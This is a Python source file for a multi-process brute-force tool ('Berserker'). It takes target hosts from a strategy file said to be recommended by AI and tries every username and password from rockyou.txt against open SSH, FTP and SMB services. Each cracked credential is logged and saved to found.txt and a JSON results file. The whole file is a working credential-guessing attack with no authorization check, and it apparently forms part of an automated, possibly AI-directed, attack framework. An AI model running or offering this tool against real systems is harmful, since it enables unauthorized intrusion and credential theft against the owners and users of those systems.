import os
import json
import time
import ftplib
import paramiko
import argparse
import socket
from datetime import datetime
from multiprocessing import Process, Manager, current_process
from smb.SMBConnection import SMBConnection

CONTEXT_FILE = "data/context/context.json"
STRATEGY_DIR = "data/strategy"
USERLIST_PATH = "/usr/share/wordlists/usernames.txt"
PASSLIST_PATH = "/usr/share/wordlists/rockyou.txt"
LOG_FILE = "logs/brute_forces.log"
FOUND_FILE = "logs/found.txt"
JSON_OUT_DIR = "data/results/"

os.makedirs("logs", exist_ok=True)
os.makedirs(JSON_OUT_DIR, exist_ok=True)

def get_latest_strategy_file():
    try:
        files = [f for f in os.listdir(STRATEGY_DIR) if f.startswith("strategy_map_") and f.endswith(".json")]
        if not files:
            return None
        latest = max(files, key=lambda f: os.path.getmtime(os.path.join(STRATEGY_DIR, f)))
        return os.path.join(STRATEGY_DIR, latest)
    except:
        return None

def log_attempt(ip, port, service, username, password, result):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{current_process().name}] {service.upper()} → {ip}:{port} | {username}:{password} → {result}"
    with open(LOG_FILE, "a") as logf:
        logf.write(line + "\n")
    print(line, flush=True)

def try_ssh_login(ip, port, username, password, success_logins, attempt_counter):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attempt_counter["count"] += 1
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=10, banner_timeout=10)
        client.close()
        log_attempt(ip, port, "ssh", username, password, "✅ SUCCESS 🎯")
        success_logins.append({
            "ip": ip, "port": port, "service": "ssh", "username": username, "password": password
        })
        with open(FOUND_FILE, "a") as found:
            found.write(f"{ip}:{port} (SSH) → {username}:{password}\n")
        return True
    except paramiko.AuthenticationException:
        log_attempt(ip, port, "ssh", username, password, "❌ FAIL")
    except paramiko.SSHException as e:
        log_attempt(ip, port, "ssh", username, password, f"⚠️ SSH ERROR → {e}")
    except Exception as e:
        log_attempt(ip, port, "ssh", username, password, f"🚨 OTHER ERROR → {e}")
    finally:
        client.close()
    return False

def try_ftp_login(ip, port, username, password, success_logins, attempt_counter):
    attempt_counter["count"] += 1
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=10)
        ftp.login(username, password)
        ftp.quit()
        log_attempt(ip, port, "ftp", username, password, "✅ SUCCESS 🎯")
        success_logins.append({
            "ip": ip, "port": port, "service": "ftp", "username": username, "password": password
        })
        with open(FOUND_FILE, "a") as found:
            found.write(f"{ip}:{port} (FTP) → {username}:{password}\n")
        return True
    except ftplib.error_perm:
        log_attempt(ip, port, "ftp", username, password, "❌ FAIL")
    except Exception as e:
        log_attempt(ip, port, "ftp", username, password, f"🚨 FTP ERROR → {e}")
    return False

def try_smb_login(ip, port, username, password, hostname, success_logins, attempt_counter):
    attempt_counter["count"] += 1
    try:
        hostname = socket.gethostname()
        conn = SMBConnection(username, password, hostname, ip, use_ntlm_v2=True, is_direct_tcp=True)
        connected = conn.connect(ip, port, timeout=10)
        if connected:
            log_attempt(ip, port, "smb", username, password, "✅ SUCCESS 🎯")
            success_logins.append({
                "ip": ip, "port": port, "service": "smb", "username": username, "password": password
            })
            with open(FOUND_FILE, "a") as found:
                found.write(f"{ip}:{port} (SMB) → {username}:{password}\n")
            conn.close()
            return True
        else:
            log_attempt(ip, port, "smb", username, password, "❌ FAIL")
    except Exception as e:
        log_attempt(ip, port, "smb", username, password, f"🚨 SMB ERROR → {e}")
    return False

def load_targets():
    strategy_path = get_latest_strategy_file()
    if not os.path.exists(CONTEXT_FILE) or not strategy_path:
        print("[!] Context or strategy file missing.", flush=True)
        return []

    with open(CONTEXT_FILE, "r") as f:
        context = json.load(f)

    with open(strategy_path, "r") as f:
        strategy = json.load(f)

    brute_ips = [ip for ip, mods in strategy.items() if "brute_force" in mods]
    if not brute_ips:
        print("[~] No brute-force targets recommended by AI.", flush=True)
        return []

    targets = []
    for ip in brute_ips:
        info = context["devices"].get(ip)
        if not info or ip.startswith("10.50."):
            continue

        for proto, ports in info.get("protocols", {}).items():
            if proto == "tcp":
                for port in ports:
                    name = port.get("name", "").lower()
                    state = port.get("state", "").lower()

                    if state != "open":
                        continue

                    if name == "microsoft-ds":
                        targets.append({
                            "ip": ip,
                            "port": port["port"],
                            "service": "smb",
                            "hostname": info.get("hostname", "")
                        })
                    elif name in ["ssh", "ftp"]:
                        targets.append({
                            "ip": ip,
                            "port": port["port"],
                            "service": name,
                            "hostname": info.get("hostname", "")
                        })
    return targets

def brute_force_target(ip, port, service, hostname, usernames, passwords, delay, success_logins, attempt_counter):
    for username in usernames:
        for password in passwords:
            if service == "ssh":
                success = try_ssh_login(ip, port, username, password, success_logins, attempt_counter)
            elif service == "ftp":
                success = try_ftp_login(ip, port, username, password, success_logins, attempt_counter)
            elif service == "smb":
                success = try_smb_login(ip, port, username, password, hostname, success_logins, attempt_counter)
            else:
                return
            time.sleep(delay)
            if success:
                return

def save_json(success_logins, attempt_counter):
    timestamp = datetime.now().strftime("%Y_%m_%d_%H_%M")
    path = os.path.join(JSON_OUT_DIR, f"brute_forces_{timestamp}.json")
    result = {
        "scan_time": datetime.now().isoformat(),
        "total_attempts": attempt_counter["count"],
        "successful_logins": list(success_logins)
    }
    with open(path, "w") as f:
        json.dump(result, f, indent=4)
    print(f"\n[✓] Brute-force results saved to: {path}", flush=True)
    print(f"[✓] Total Attempts: {attempt_counter['count']} | Successful Logins: {len(success_logins)}", flush=True)

def run_brute_forces(delay):
    targets = load_targets()
    if not targets:
        print("[!] No brute-force targets found.", flush=True)
        return

    if not os.path.exists(USERLIST_PATH) or not os.path.exists(PASSLIST_PATH):
        print("[!] Userlist or passlist file is missing.", flush=True)
        return

    with open(USERLIST_PATH, encoding="latin-1") as uf:
        usernames = [line.strip() for line in uf if line.strip()]
    with open(PASSLIST_PATH, encoding="latin-1") as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    print(f"[~] Starting multi-protocol brute-force on {len(targets)} targets...\n", flush=True)

    manager = Manager()
    success_logins = manager.list()
    attempt_counter = manager.dict()
    attempt_counter["count"] = 0

    processes = []
    for target in targets:
        p = Process(
            target=brute_force_target,
            args=(target["ip"], target["port"], target["service"], target["hostname"],
                  usernames, passwords, delay, success_logins, attempt_counter),
            name=f"{target['service'].upper()}-{target['ip']}"
        )
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

    save_json(success_logins, attempt_counter)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Berserker Multi-Service Brute-Force Module")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between attempts (default: 1.0s)")
    args = parser.parse_args()

    try:
        run_brute_forces(args.delay)
    except KeyboardInterrupt:
        print("\n[!] Brute-force process interrupted by user.", flush=True)
